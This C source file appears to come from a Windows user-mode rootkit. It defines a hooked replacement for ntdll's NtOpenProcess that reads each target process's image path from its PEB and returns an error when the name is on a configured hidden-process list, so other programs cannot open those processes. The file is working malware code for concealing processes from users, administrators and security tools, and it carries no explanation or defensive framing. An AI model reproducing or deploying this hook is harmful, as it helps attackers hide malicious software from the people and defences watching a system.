#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include "ntdll.h"

#include "config.h"

#include "ntopenprocess.h"
#include "safe.h"

// ntdll.NtOpenProcess
NTSTATUS WINAPI NewNtOpenProcess
(
  PHANDLE              ProcessHandle,
  ACCESS_MASK          AccessMask,
  POBJECT_ATTRIBUTES   ObjectAttributes,
  PCLIENT_ID           ClientId 
)
{
	NTSTATUS rc;
	HANDLE hProcess;
	OBJECT_ATTRIBUTES oa={sizeof oa,0,NULL,0};
	CLIENT_ID cid;
	PROCESS_BASIC_INFORMATION pbi;
	PROCESS_PARAMETERS pPp;
	PEB Peb;
	WCHAR* pcProcessFullPath=NULL;
	UNICODE_STRING usProcess;
	ANSI_STRING asProcess;
	CHAR* pcShortProcess;
	DWORD dwLen;

	if (ClientId) RtlCopyMemory(&cid,ClientId,sizeof(cid));

	rc=OldNtOpenProcess(
		&hProcess,
		PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,
		&oa,
		&cid	
		);

	if (NT_SUCCESS(rc))
	{
		rc=NtQueryInformationProcess(hProcess,ProcessBasicInformation,&pbi,sizeof(pbi),NULL);
		if (!NT_SUCCESS(rc))
		{
			NtClose(hProcess);
			goto end;
		}

		// read PEB
		if (!NT_SUCCESS(SafeNtReadVirtualMemory(hProcess,pbi.PebBaseAddress,&Peb,sizeof(Peb),NULL)))
		{
			NtClose(hProcess);
			goto end;
		}

		// read ProcessParameters
		if (!NT_SUCCESS(SafeNtReadVirtualMemory(hProcess,Peb.ProcessParameters,&pPp,sizeof(pPp),NULL)))
		{
			NtClose(hProcess);
			goto end;
		}

		dwLen=pPp.ImagePathName.Length+2;
		if (!NT_SUCCESS(NtAllocateVirtualMemory(NtCurrentProcess(),&pcProcessFullPath,0,&dwLen,MEM_COMMIT|MEM_TOP_DOWN,PAGE_READWRITE)))
		{
			NtClose(hProcess);
			goto end;
		}

		RtlZeroMemory(pcProcessFullPath,pPp.ImagePathName.Length+2);
		if (!NT_SUCCESS(SafeNtReadVirtualMemory(hProcess,pPp.ImagePathName.Buffer,pcProcessFullPath,pPp.ImagePathName.Length,NULL)))
		{
			NtClose(hProcess);
			NtFreeVirtualMemory(NtCurrentProcess(),&pcProcessFullPath,&dwLen,MEM_RELEASE);
			goto end;
		}

		usProcess.Buffer=pcProcessFullPath;
		usProcess.Length=pPp.ImagePathName.Length;
		usProcess.MaximumLength=pPp.ImagePathName.Length;

		if (!NT_SUCCESS(RtlUnicodeStringToAnsiString(&asProcess,&usProcess,TRUE)))
		{
			NtClose(hProcess);
			NtFreeVirtualMemory(NtCurrentProcess(),&pcProcessFullPath,&dwLen,MEM_RELEASE);
			goto end;
		}

		pcShortProcess=(CHAR*)(strrchr(asProcess.Buffer,'\\')+1);
		if (!pcShortProcess)
		{
			NtClose(hProcess);
			RtlFreeAnsiString(&asProcess);
			NtFreeVirtualMemory(NtCurrentProcess(),&pcProcessFullPath,&dwLen,MEM_RELEASE);
			goto end;
		}

		if (config_CheckString(ConfigHiddenProcess,pcShortProcess,0))
		{
			NtClose(hProcess);
			RtlFreeAnsiString(&asProcess);
			NtFreeVirtualMemory(NtCurrentProcess(),&pcProcessFullPath,&dwLen,MEM_RELEASE);
			return STATUS_INVALID_PARAMETER;
		}

		NtClose(hProcess);
		RtlFreeAnsiString(&asProcess);
		NtFreeVirtualMemory(NtCurrentProcess(),&pcProcessFullPath,&dwLen,MEM_RELEASE);
	}

end:
	rc=OldNtOpenProcess(
		ProcessHandle,
		AccessMask,
		ObjectAttributes,
		ClientId 
		);

	return rc;
}